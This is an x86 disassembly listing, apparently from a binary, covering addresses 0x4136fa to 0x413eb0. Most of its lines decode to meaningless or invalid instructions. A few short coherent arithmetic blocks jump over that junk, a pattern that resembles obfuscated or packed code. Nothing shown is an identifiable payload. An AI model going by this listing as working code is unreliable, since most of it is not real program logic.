  4136fa:	sub    ch,BYTE PTR [edx+eiz*4-0x3b110f8e]
  413701:	add    dh,BYTE PTR [esi-0x5814e7d2]
  413707:	dec    ebx
  413708:	adc    edi,edi
  41370a:	jg     0x413694
  41370c:	xor    esi,edx
  41370e:	int    0xf3
  413710:	(bad)  
  413712:	adc    edx,DWORD PTR [edx+ecx*4+0x7e9c0fef]
  413719:	xchg   ebp,eax
  41371a:	mov    ebp,0x6330fee2
  41371f:	out    0xba,al
  413721:	mov    BYTE PTR [edx],bl
  413723:	sbb    dl,dh
  413725:	inc    ebx
  413726:	lods   eax,DWORD PTR ds:[esi]
  413727:	pop    ebx
  413728:	jg     0x4136eb
  41372a:	xchg   ebx,eax
  41372b:	push   ecx
  41372c:	ds pop edi
  41372e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41372f:	js     0x4136bb
  413731:	xor    BYTE PTR [ebp+ebp*2+0x46bcec60],0x4e
  413739:	lock shl esp,1
  41373c:	scas   al,BYTE PTR es:[edi]
  41373d:	inc    esp
  41373e:	or     eax,0x2ff10256
  413743:	inc    eax
  413744:	call   0x64e9:0xdf78a1e5
  41374b:	std    
  41374c:	mov    ss,WORD PTR [ebp+0x364f23dd]
  413752:	idiv   ebp
  413754:	ret    0x3c02
  413757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413758:	pop    edx
  413759:	push   ss
  41375a:	sub    al,0x62
  41375c:	push   es
  41375d:	xchg   edi,eax
  41375e:	rcr    ecx,cl
  413760:	inc    esi
  413761:	jno    0x4136f6
  413763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413764:	dec    esi
  413765:	test   eax,0x7eba1533
  41376a:	into   
  41376b:	jmp    0x4137ab
  41376d:	ret    0xd3c4
  413770:	(bad)  [ebp+eax*8-0x3e23ddef]
  413777:	inc    ecx
  413778:	dec    ebp
  413779:	popa   
  41377a:	and    DWORD PTR [ecx+eiz*2+0xa],esp
  41377e:	repz into 
  413780:	fisub  WORD PTR [edx]
  413782:	xchg   BYTE PTR [edx+0x983a385],dl
  413788:	(bad)  
  413789:	mov    ebp,0xdc32a53e
  41378e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378f:	outs   dx,DWORD PTR ds:[esi]
  413790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413791:	retf   0xe21d
  413794:	mov    al,ds:0x95e23090
  413799:	ds dec esi
  41379b:	lea    esi,[esi]
  41379d:	push   esp
  41379e:	push   esp
  41379f:	fild   DWORD PTR [edi+edx*4+0x7600b5cb]
  4137a6:	adc    BYTE PTR [eax-0x2e],dh
  4137a9:	push   ebx
  4137aa:	mov    ds:0x3dfc8e62,eax
  4137af:	mov    DWORD PTR [edx+0x52],ebp
  4137b2:	and    edx,DWORD PTR [eax*2+0x3d80e8c1]
  4137b9:	sbb    al,0x6e
  4137bb:	adc    BYTE PTR [ebx],ch
  4137bd:	adc    DWORD PTR [ebx+ebx*8-0x40],edi
  4137c1:	or     al,0x1f
  4137c3:	pushf  
  4137c4:	mov    bl,0xbd
  4137c6:	into   
  4137c7:	adc    edi,DWORD PTR [edx+0x1aa37784]
  4137cd:	call   0x962f067
  4137d2:	inc    esi
  4137d3:	dec    edx
  4137d4:	scas   al,BYTE PTR es:[edi]
  4137d5:	je     0x41379b
  4137d7:	pop    ss
  4137d8:	or     eax,0x979039d6
  4137dd:	xor    eax,0xf0856cf7
  4137e2:	loopne 0x41384b
  4137e4:	xor    al,0xa9
  4137e6:	adc    al,0x18
  4137e8:	repnz or BYTE PTR [edx],0x44
  4137ec:	ret    0x2817
  4137ef:	xor    DWORD PTR [ecx-0x7babc1bf],eax
  4137f5:	mov    bl,0x21
  4137f7:	and    BYTE PTR [edi+eiz*1],al
  4137fa:	adc    dl,dl
  4137fc:	xchg   esp,eax
  4137fd:	sbb    eax,0xd513426f
  413802:	(bad)  
  413803:	fs xchg esi,eax
  413805:	idiv   BYTE PTR [ebx-0x67]
  413808:	ins    BYTE PTR es:[edi],dx
  413809:	lock ins DWORD PTR es:[edi],dx
  41380b:	lahf   
  41380c:	stos   DWORD PTR es:[edi],eax
  41380d:	das    
  41380e:	lods   eax,DWORD PTR ds:[esi]
  41380f:	mov    esp,0x8f4b81f6
  413814:	mov    eax,DWORD PTR [edx+edx*2]
  413817:	cmp    edi,ebx
  413819:	jmp    0x4cfd:0x29cc74f1
  413820:	inc    edx
  413821:	pusha  
  413822:	sbb    BYTE PTR [edi-0x39],ch
  413825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413826:	mov    ah,0x69
  413828:	sbb    al,0x67
  41382a:	add    ebx,esi
  41382c:	xchg   ebx,eax
  41382d:	jo     0x4137da
  41382f:	xlat   BYTE PTR ds:[ebx]
  413830:	mov    ebp,0x117d4374
  413835:	xor    edx,DWORD PTR [esi+ebp*8-0x2f456452]
  41383c:	(bad)  
  41383d:	jmp    0xeb40c17a
  413842:	mov    ah,0x79
  413844:	jae    0x4137e5
  413846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413847:	mov    eax,0x75f7c5f1
  41384c:	sub    al,0x41
  41384e:	es into 
  413850:	int3   
  413851:	sbb    eax,0x75613a7b
  413856:	addr16 popf 
  413858:	clc    
  413859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41385a:	mov    edi,0xd36516f8
  41385f:	mov    ebp,0xdc54cf1d
  413864:	pop    ds
  413865:	dec    ebp
  413866:	retf   
  413867:	popf   
  413868:	pop    esp
  413869:	aam    0xd6
  41386b:	sbb    DWORD PTR [esi],edi
  41386d:	in     eax,0x7b
  41386f:	add    ebp,DWORD PTR [edx]
  413871:	jb     0x4138e5
  413873:	sbb    edx,DWORD PTR [edx]
  413875:	in     eax,0xee
  413877:	and    ch,dh
  413879:	jge    0x413871
  41387b:	mov    bl,0x99
  41387d:	aam    0xbc
  41387f:	xor    eax,0xfb327a5b
  413884:	aaa    
  413885:	cld    
  413886:	fistp  QWORD PTR ds:0x9bdbd963
  41388c:	mov    ebp,0x1749a800
  413891:	mov    BYTE PTR [ebx-0x1c5b595d],cl
  413897:	adc    DWORD PTR [eax-0x75],0xf181e45d
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0x6c],ebp
  4138e5:	aad    0x9f
  4138e7:	jo     0x4138e0
  4138e9:	cmp    bl,BYTE PTR [eax]
  4138eb:	sbb    BYTE PTR [edx+0x2e181812],ch
  4138f1:	out    dx,al
  4138f2:	xor    al,0x30
  4138f4:	sub    al,0x41
  4138f6:	or     esp,DWORD PTR ds:0x8311eb33
  4138fc:	add    BYTE PTR [ecx-0x5a2c33b9],ch
  413902:	or     bh,BYTE PTR [eax]
  413904:	inc    ecx
  413905:	sbb    BYTE PTR [edx],dh
  413907:	xchg   esi,eax
  413908:	iret   
  413909:	sbb    eax,0xef2dee83
  41390e:	shl    BYTE PTR [edi],0xe6
  413911:	push   0x619678ba
  413916:	inc    ebx
  413917:	test   BYTE PTR [esi],ah
  413919:	loopne 0x41389b
  41391b:	in     al,0x6a
  41391d:	xor    BYTE PTR [ecx+0x5b39df86],0xaa
  413924:	push   cs
  413925:	sub    DWORD PTR [ebp-0x80],ebx
  413928:	pop    edi
  413929:	ret    
  41392a:	leave  
  41392b:	sti    
  41392c:	jg     0x413961
  41392e:	or     ebp,ebx
  413930:	cmp    cl,BYTE PTR [esp+eax*4+0x4a]
  413934:	in     al,0x12
  413936:	nop
  413937:	or     DWORD PTR [ecx-0x39],ecx
  41393a:	inc    ebp
  41393b:	fdivr  DWORD PTR [esi+esi*2-0x31]
  41393f:	icebp  
  413940:	fwait
  413941:	or     eax,0xdae7e9f3
  413946:	adc    BYTE PTR [ecx-0x626010b1],bl
  41394c:	in     al,0x77
  41394e:	mov    esi,0xab35947e
  413953:	push   0xffffffbe
  413955:	jo     0x4138ed
  413957:	fcomp  QWORD PTR [esi+0x72]
  41395a:	xchg   ebx,eax
  41395b:	adc    eax,0x35efcda3
  413960:	pop    esi
  413961:	inc    esi
  413962:	inc    ebp
  413963:	lods   eax,DWORD PTR ds:[esi]
  413964:	xor    bl,ch
  413966:	rcr    BYTE PTR [ecx+edx*2-0x21981df9],cl
  41396d:	aam    0x26
  41396f:	push   ebx
  413970:	stos   DWORD PTR es:[edi],eax
  413971:	sbb    al,0x23
  413973:	out    0xe,eax
  413975:	mov    ecx,0x9422e0d2
  41397a:	gs jb  0x413902
  41397d:	in     al,0x14
  41397f:	frstor [eax-0x1c55928c]
  413985:	ss pop edi
  413987:	mov    esp,gs
  413989:	stos   BYTE PTR es:[edi],al
  41398a:	mov    ebp,0xabc5c6b3
  41398f:	cdq    
  413990:	mov    ss,WORD PTR [ecx+esi*2+0x5e]
  413994:	inc    edi
  413995:	sar    DWORD PTR [esi+0xfc3a307],1
  41399b:	mov    ds:0xbab70c2b,al
  4139a0:	aad    0xa2
  4139a2:	clc    
  4139a3:	mov    cl,0xb3
  4139a5:	or     DWORD PTR ds:0xcda226f1,edi
  4139ab:	xor    al,0x2e
  4139ad:	retf   
  4139ae:	pop    esp
  4139af:	rcl    DWORD PTR [ebp+0x426f971b],1
  4139b5:	jmp    0xfab:0x948c8c62
  4139bc:	std    
  4139bd:	inc    edi
  4139be:	jae    0x4139bd
  4139c0:	and    bh,BYTE PTR [esp+ecx*2]
  4139c3:	stos   BYTE PTR es:[edi],al
  4139c4:	and    ecx,eax
  4139c6:	and    al,0x6c
  4139c8:	lock jnp 0x4139f2
  4139cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139cc:	jno    0x413951
  4139ce:	sbb    al,ah
  4139d0:	loop   0x41396a
  4139d2:	mov    esi,0x46e1df59
  4139d7:	stos   BYTE PTR es:[edi],al
  4139d8:	sbb    eax,0x527ed564
  4139dd:	cld    
  4139de:	add    dl,al
  4139e0:	ror    DWORD PTR [esi-0xb],0xf2
  4139e4:	icebp  
  4139e5:	or     DWORD PTR [ebp+0x5ac22279],ebx
  4139eb:	and    eax,0xa1f7fbca
  4139f0:	(bad)  
  4139f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f3:	jb     0x4139cc
  4139f5:	jg     0x41399f
  4139f7:	inc    edi
  4139f8:	mov    bl,0x6a
  4139fa:	mov    DWORD PTR [esi-0x3b],eax
  4139fd:	addr16 push es
  4139ff:	div    DWORD PTR [ecx-0xe]
  413a02:	retf   
  413a03:	stos   BYTE PTR es:[edi],al
  413a04:	mov    eax,0xcc74b844
  413a09:	mov    ds:0x92765ac8,eax
  413a0e:	into   
  413a0f:	mov    al,0x55
  413a11:	xchg   ebx,eax
  413a12:	int3   
  413a13:	cmp    al,0x62
  413a15:	not    DWORD PTR [ebx]
  413a17:	fs ins DWORD PTR es:[edi],dx
  413a19:	mov    edx,0x194f9aa3
  413a1e:	mov    ebx,0x7e7377cd
  413a23:	mov    BYTE PTR ds:0x3e7df0c2,dl
  413a29:	pop    ecx
  413a2a:	loop   0x4139d8
  413a2c:	pop    edi
  413a2d:	adc    eax,0x64641b6a
  413a32:	pusha  
  413a33:	rcl    DWORD PTR [ebx-0x681cc524],cl
  413a39:	mov    al,ds:0xfa80c635
  413a3e:	mov    ebx,?
  413a40:	jle    0x413a94
  413a42:	xor    eax,0x841a19b8
  413a47:	fsubr  st,st(5)
  413a49:	cli    
  413a4a:	push   cs
  413a4b:	jg     0x4139ff
  413a4d:	pusha  
  413a4e:	lock and cl,BYTE PTR [esi-0x258960cc]
  413a55:	inc    eax
  413a56:	push   ds
  413a57:	sbb    eax,0xb16dcc3d
  413a5c:	psubusw mm1,QWORD PTR [edi+0x4e]
  413a60:	push   ebp
  413a61:	fadd   st,st(4)
  413a63:	or     edi,DWORD PTR [esi-0x7681e0b8]
  413a69:	mov    bh,0x36
  413a6b:	pop    ecx
  413a6c:	pop    esi
  413a6d:	fisub  WORD PTR [eax+0x0]
  413a70:	cwde   
  413a71:	and    al,0xef
  413a73:	scas   al,BYTE PTR es:[edi]
  413a74:	pushf  
  413a75:	mov    eax,0x18a12538
  413a7a:	add    dl,BYTE PTR [esi]
  413a7c:	or     al,0x6a
  413a7e:	cdq    
  413a7f:	lods   al,BYTE PTR ds:[esi]
  413a80:	and    DWORD PTR [edi],ecx
  413a82:	scas   eax,DWORD PTR es:[edi]
  413a83:	cli    
  413a84:	dec    eax
  413a85:	les    edx,FWORD PTR [ecx]
  413a87:	xor    eax,0xf441947e
  413a8c:	xor    eax,0x54e657ff
  413a91:	mov    ebx,0xb254666e
  413a96:	inc    ebp
  413a97:	add    eax,0x3e4e9453
  413a9c:	outs   dx,BYTE PTR ds:[esi]
  413a9d:	add    ebx,DWORD PTR [edx-0x417066fa]
  413aa3:	fidiv  DWORD PTR [ebp+0x75a7b38d]
  413aa9:	ins    DWORD PTR es:[edi],dx
  413aaa:	or     BYTE PTR [esi+0x1d],dl
  413aad:	fild   DWORD PTR [edi+0x75]
  413ab0:	add    DWORD PTR [esi-0x142c7526],ebp
  413ab6:	jmp    0x94d64519
  413abb:	stos   BYTE PTR es:[edi],al
  413abc:	sub    BYTE PTR [eax+edx*4-0x3dcbc848],ch
  413ac3:	clc    
  413ac4:	add    edx,DWORD PTR [ecx]
  413ac6:	nop
  413ac7:	pushf  
  413ac8:	inc    esi
  413ac9:	stc    
  413aca:	rcl    cl,cl
  413acc:	jnp    0x413b3f
  413ace:	add    eax,0xfdb39f93
  413ad3:	xchg   ecx,eax
  413ad4:	sub    dl,al
  413ad6:	repz sub DWORD PTR [edi+0x34],ebp
  413ada:	jb     0x413aae
  413adc:	fwait
  413add:	inc    DWORD PTR [ebx+eax*1]
  413ae0:	pop    es
  413ae1:	inc    esi
  413ae2:	in     eax,0xa9
  413ae4:	jge    0x413b31
  413ae6:	outs   dx,BYTE PTR ds:[esi]
  413ae7:	jb     0x413b1c
  413ae9:	(bad)  
  413aea:	jmp    0xa002d799
  413aef:	add    eax,0x86c3092b
  413af4:	and    edi,DWORD PTR [ebx]
  413af6:	ss mov dl,0xe
  413af9:	sub    al,0xa4
  413afb:	repnz pushf 
  413afd:	int    0x84
  413aff:	push   cs
  413b00:	xchg   edi,eax
  413b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b02:	jns    0x413b3d
  413b04:	shl    BYTE PTR [ebp+0x24],cl
  413b07:	xor    BYTE PTR [edi+0x5ac0e482],0x4c
  413b0e:	jnp    0x413acb
  413b10:	addr16 push 0x4891ff8d
  413b16:	sbb    cl,BYTE PTR [edi+0x7e8eb96b]
  413b1c:	scas   al,BYTE PTR es:[edi]
  413b1d:	or     BYTE PTR [esi],ah
  413b1f:	dec    esi
  413b20:	popa   
  413b21:	dec    esp
  413b22:	dec    ebp
  413b23:	xor    cl,BYTE PTR [ebx+0xf]
  413b26:	popa   
  413b27:	jg     0x413b64
  413b29:	inc    eax
  413b2a:	jp     0x413b84
  413b2c:	mov    bl,0x8c
  413b2e:	or     BYTE PTR [ebp-0x6],bl
  413b31:	scas   eax,DWORD PTR es:[edi]
  413b32:	mov    edx,0xf3f07f91
  413b37:	pop    edi
  413b38:	xor    al,dl
  413b3a:	loope  0x413b6b
  413b3c:	push   0xffffff91
  413b3e:	mov    eax,ds:0xdb0e085f
  413b43:	lahf   
  413b44:	mov    ebp,DWORD PTR [edi]
  413b46:	mov    eax,ds:0xb895eb3f
  413b4b:	retf   0x8a36
  413b4e:	paddusb mm5,mm1
  413b51:	cli    
  413b52:	mov    ds:0x346353cf,al
  413b57:	or     al,0xd7
  413b59:	inc    ecx
  413b5a:	iret   
  413b5b:	jae    0x413b27
  413b5d:	dec    esp
  413b5e:	lar    ebx,di
  413b61:	popa   
  413b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b63:	xchg   eax,ebp
  413b65:	stos   BYTE PTR es:[edi],al
  413b66:	inc    esi
  413b68:	cmp    DWORD PTR es:[edi-0x42],ecx
  413b6c:	inc    ebp
  413b6d:	dec    esi
  413b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6f:	push   ds
  413b70:	pop    ebx
  413b71:	pop    ebx
  413b72:	push   es
  413b73:	sbb    eax,0x14740019
  413b78:	shr    BYTE PTR [esi+0x14],cl
  413b7b:	scas   eax,DWORD PTR es:[edi]
  413b7c:	cmp    bl,BYTE PTR [edi+0x4c254519]
  413b82:	add    eax,0xd758a2b3
  413b87:	sbb    eax,0x99cdc923
  413b8c:	push   0x14
  413b8e:	and    eax,DWORD PTR [ecx-0x364965e4]
  413b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b95:	ss inc ebp
  413b97:	out    0x83,eax
  413b99:	xchg   ebx,eax
  413b9a:	mov    ebp,0x1b7ff3a7
  413b9f:	adc    eax,0xbe169a7a
  413ba4:	xor    BYTE PTR [esi+0x63cbc001],0x99
  413bab:	jae    0x413c05
  413bad:	dec    BYTE PTR [ebx]
  413baf:	test   al,0xfb
  413bb1:	call   0x5bc56b65
  413bb6:	shr    edi,0xd9
  413bb9:	jne    0x413c13
  413bbb:	push   esp
  413bbc:	xor    DWORD PTR [esi],eax
  413bbe:	jns    0x413be8
  413bc0:	fs jb  0x413b7b
  413bc3:	fdivr  DWORD PTR [eax]
  413bc5:	cmc    
  413bc6:	adc    dh,BYTE PTR [ecx+eax*8]
  413bc9:	jecxz  0x413bb4
  413bcb:	pop    ecx
  413bcc:	sahf   
  413bcd:	imul   esp,DWORD PTR [esi],0xbdd3bb67
  413bd3:	imul   ebx,DWORD PTR [esp+edi*8+0x6e],0xfffffff1
  413bd8:	cmp    al,0x7c
  413bda:	xchg   esi,eax
  413bdb:	in     eax,dx
  413bdc:	stc    
  413bdd:	test   DWORD PTR [eax],edi
  413bdf:	dec    esp
  413be0:	dec    edi
  413be1:	jns    0x413bce
  413be3:	jg     0x413c52
  413be5:	ds cmp al,0x64
  413be8:	popa   
  413be9:	add    BYTE PTR [ecx-0x61ee7ddc],ah
  413bef:	xchg   esi,eax
  413bf0:	push   esi
  413bf1:	out    0xc0,al
  413bf3:	mov    edx,0xb2b83d81
  413bf8:	adc    DWORD PTR [ecx],esi
  413bfa:	inc    eax
  413bfb:	repz fiadd DWORD PTR [edi]
  413bfe:	push   ecx
  413bff:	lahf   
  413c00:	sub    ebx,DWORD PTR [ebx-0x76286615]
  413c06:	xor    DWORD PTR ds:0x6f464307,ecx
  413c0c:	add    eax,0xdbe692
  413c11:	arpl   WORD PTR [edx],bp
  413c13:	int    0x10
  413c15:	mov    ah,0xd
  413c17:	mov    dh,0xf3
  413c19:	addr16 out 0xb0,eax
  413c1c:	mov    ds:0xb034afb,al
  413c21:	(bad)  
  413c22:	mov    ds:0x35c5de8d,al
  413c27:	pop    ss
  413c28:	out    dx,al
  413c29:	leave  
  413c2a:	lods   al,BYTE PTR ds:[esi]
  413c2b:	(bad)  
  413c2c:	ficom  DWORD PTR [edi+0x5d]
  413c2f:	cs inc edi
  413c31:	push   ss
  413c32:	dec    esp
  413c33:	mov    esi,0x647c8091
  413c38:	hlt    
  413c39:	es retf 
  413c3b:	dec    ecx
  413c3c:	sbb    BYTE PTR [ecx+0x19],bh
  413c3f:	mov    edi,0xb53b0e1f
  413c44:	and    edx,edi
  413c46:	daa    
  413c47:	or     esi,eax
  413c49:	imul   esi,DWORD PTR [ecx+0x3b53288d],0x5c8f38b4
  413c53:	fld    DWORD PTR [esi-0x1dbd4c0]
  413c59:	nop
  413c5a:	and    ebp,DWORD PTR [edi]
  413c5c:	adc    BYTE PTR [edx],ah
  413c5e:	test   eax,0x816c83b4
  413c63:	jae    0x413c1d
  413c65:	inc    eax
  413c66:	jecxz  0x413bfb
  413c68:	div    DWORD PTR [ebx-0x5ba31bcc]
  413c6e:	pop    esp
  413c6f:	pop    edi
  413c70:	dec    ebp
  413c71:	repnz inc ebp
  413c73:	fist   WORD PTR [ecx+0x49259a16]
  413c79:	add    edi,edx
  413c7b:	(bad)  [ebp+0x4c622d00]
  413c81:	jae    0x413cde
  413c83:	inc    edx
  413c84:	in     eax,0xb
  413c86:	jp     0x413c3c
  413c88:	addr16 sbb al,0x8f
  413c8b:	jb     0x413c2c
  413c8d:	dec    esp
  413c8e:	mov    esp,0x7a4f354c
  413c93:	sti    
  413c94:	(bad)  
  413c95:	pop    eax
  413c96:	dec    ecx
  413c97:	dec    esp
  413c98:	push   eax
  413c99:	inc    ecx
  413c9a:	(bad)  
  413c9b:	push   es
  413c9c:	popf   
  413c9d:	inc    esi
  413c9e:	jno    0x413c32
  413ca0:	dec    ebx
  413ca1:	push   0x57
  413ca3:	rcr    al,cl
  413ca5:	dec    BYTE PTR [edx+0x714daeca]
  413cab:	add    edx,DWORD PTR [eax]
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	add    esi,DWORD PTR [eax]
  413d00:	dec    ecx
  413d01:	push   0xffffff89
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx+0x17181812],ch
  413d0b:	or     esi,0x287ba826
  413d11:	sub    al,BYTE PTR [esi+0x1c]
  413d14:	pop    edi
  413d15:	jno    0x413d86
  413d17:	mov    esp,DWORD PTR [edi+esi*8]
  413d1a:	rcl    DWORD PTR [edi-0x14],cl
  413d1d:	jmp    0x8331:0xbe25631f
  413d24:	cmp    BYTE PTR [ebp+0x522f04e6],dl
  413d2a:	jle    0x413da4
  413d2c:	fadd   st,st(6)
  413d2e:	lock adc BYTE PTR [edi+0x232bf269],dl
  413d35:	rcl    DWORD PTR [edx-0x240ca5e9],0xc0
  413d3c:	ror    esp,0x31
  413d3f:	xchg   edx,eax
  413d40:	adc    ecx,DWORD PTR [ecx+0x1701a399]
  413d46:	out    dx,eax
  413d47:	mov    ebx,0xb955fba0
  413d4c:	scas   al,BYTE PTR es:[edi]
  413d4d:	retf   0xf129
  413d50:	push   edi
  413d51:	pusha  
  413d52:	in     al,dx
  413d53:	push   es
  413d54:	sar    BYTE PTR [edx+0x27],cl
  413d57:	jne    0x413dbc
  413d59:	les    ecx,FWORD PTR [esi-0x69b0665]
  413d5f:	pop    es
  413d60:	ror    DWORD PTR [edx-0xd],1
  413d63:	jmp    0x2522d912
  413d68:	dec    ebp
  413d69:	stos   WORD PTR es:[di],ax
  413d6c:	push   ebx
  413d6d:	mov    ebp,0x77cff7c6
  413d72:	repz adc edx,ecx
  413d75:	(bad)  [eax+0x6a5dc237]
  413d7b:	push   eax
  413d7c:	push   0x73ab3af
  413d81:	dec    ecx
  413d82:	cmp    DWORD PTR [edi+0xf9c2b7f],ebx
  413d88:	lds    edi,FWORD PTR [edi]
  413d8a:	std    
  413d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d8c:	cmp    ebx,edi
  413d8e:	into   
  413d8f:	push   cs
  413d90:	imul   edx,DWORD PTR [ebp+ecx*4-0x577768a4],0x87ba8276
  413d9b:	(bad)  
  413d9c:	fadd   st,st(2)
  413d9e:	mov    al,0x45
  413da0:	ds popa 
  413da2:	outs   dx,DWORD PTR ds:[esi]
  413da3:	xchg   ebx,eax
  413da4:	xchg   ebp,eax
  413da5:	xchg   edx,eax
  413da6:	or     eax,0xfbf7ae23
  413dab:	test   DWORD PTR [ecx+0x6306f63c],ebp
  413db1:	cmp    BYTE PTR [ebx],dl
  413db3:	lock pop ecx
  413db5:	adc    bl,bl
  413db7:	pushf  
  413db8:	jp     0x413d4c
  413dba:	stos   BYTE PTR es:[edi],al
  413dbb:	push   esi
  413dbc:	jnp    0x413e13
  413dbe:	lods   eax,DWORD PTR ds:[esi]
  413dbf:	or     al,0x6f
  413dc1:	jns    0x413dd5
  413dc3:	mov    ds:0x27443e77,eax
  413dc8:	ss jmp 0x413e44
  413dcb:	xchg   DWORD PTR [edi],ecx
  413dcd:	pushf  
  413dce:	daa    
  413dcf:	stc    
  413dd0:	sbb    al,0x60
  413dd2:	nop
  413dd3:	inc    esp
  413dd4:	(bad)  
  413dd5:	pop    ebx
  413dd6:	cld    
  413dd7:	jp     0x413e31
  413dd9:	push   0xffffff8d
  413ddb:	addr16 aas 
  413ddd:	push   esp
  413dde:	jns    0x413e2d
  413de0:	mov    esi,0x3e73454b
  413de5:	cwde   
  413de6:	ss popf 
  413de8:	fiadd  WORD PTR [esi+0x75]
  413deb:	sub    eax,0xfc8ee712
  413df0:	(bad)  
  413df1:	scas   al,BYTE PTR es:[edi]
  413df2:	retf   0xdb40
  413df5:	icebp  
  413df6:	mov    eax,DWORD PTR [eax+eax*8]
  413df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dfa:	add    ebx,esp
  413dfc:	loope  0x413e1b
  413dfe:	in     al,dx
  413dff:	imul   ebp,esp,0xffffffc4
  413e02:	cmp    dh,BYTE PTR [edx+0x65]
  413e05:	jge    0x413e3f
  413e07:	push   edi
  413e08:	push   ebp
  413e09:	sti    
  413e0a:	dec    esp
  413e0b:	push   ebp
  413e0c:	aaa    
  413e0d:	cmp    edi,DWORD PTR [ebp+0x397eeacf]
  413e13:	push   esp
  413e14:	ins    DWORD PTR es:[edi],dx
  413e15:	sub    cl,cl
  413e17:	mov    esi,DWORD PTR [edi+0x1cf7ec8e]
  413e1d:	out    dx,al
  413e1e:	ja     0x413e8b
  413e20:	pop    edi
  413e21:	rcr    BYTE PTR [ecx-0x4e],0xb1
  413e25:	xor    esp,DWORD PTR [edi+0x5d]
  413e28:	cmc    
  413e29:	xchg   esi,eax
  413e2a:	loopne 0x413e33
  413e2c:	or     eax,0xdc9b04e5
  413e31:	mov    edi,0x2bcb4e2
  413e36:	out    dx,eax
  413e37:	ret    
  413e38:	pop    ss
  413e39:	cmp    dh,bl
  413e3b:	and    DWORD PTR [esi],edx
  413e3d:	jo     0x413e64
  413e3f:	push   ds
  413e40:	mov    ebx,0x94efa86d
  413e45:	sub    esi,DWORD PTR [edx]
  413e47:	dec    eax
  413e48:	dec    ebx
  413e49:	xor    bh,BYTE PTR [ebx+0x5b2e6529]
  413e4f:	loop   0x413e7a
  413e51:	dec    eax
  413e52:	int    0xe3
  413e54:	and    ch,BYTE PTR [esi]
  413e56:	js     0x413deb
  413e58:	shl    BYTE PTR [eax],1
  413e5a:	xlat   BYTE PTR ds:[ebx]
  413e5b:	pushf  
  413e5c:	push   ecx
  413e5d:	xchg   esp,eax
  413e5e:	lods   eax,DWORD PTR ds:[esi]
  413e5f:	add    DWORD PTR [ecx-0x7c],0xffffffd7
  413e63:	mov    edi,DWORD PTR cs:[edi+edx*2-0x3d]
  413e68:	call   0xdddd:0x80150ab
  413e6f:	add    BYTE PTR [ecx-0x486b53a8],dh
  413e75:	dec    edx
  413e76:	inc    esp
  413e77:	adc    BYTE PTR [edx+0x615f9545],dl
  413e7d:	fwait
  413e7e:	xor    eax,0xdcde247d
  413e83:	cmp    eax,0xa0dced5f
  413e88:	mov    edx,DWORD PTR [edx+0x1dcb6c02]
  413e8e:	out    0xf4,al
  413e90:	or     ebp,DWORD PTR [edx-0x43bd9638]
  413e96:	ds and dl,bl
  413e99:	dec    esi
  413e9a:	sbb    edx,DWORD PTR [esi+ecx*1+0x70]
  413e9e:	mov    ecx,0x10f00025
  413ea3:	pusha  
  413ea4:	dec    edi
  413ea5:	inc    esi
  413ea6:	and    BYTE PTR [eax-0x41ccae0d],dl
  413eac:	mov    edx,DWORD PTR [esi]
  413eae:	in     eax,0xee
  413eb0:	js     0x413f27
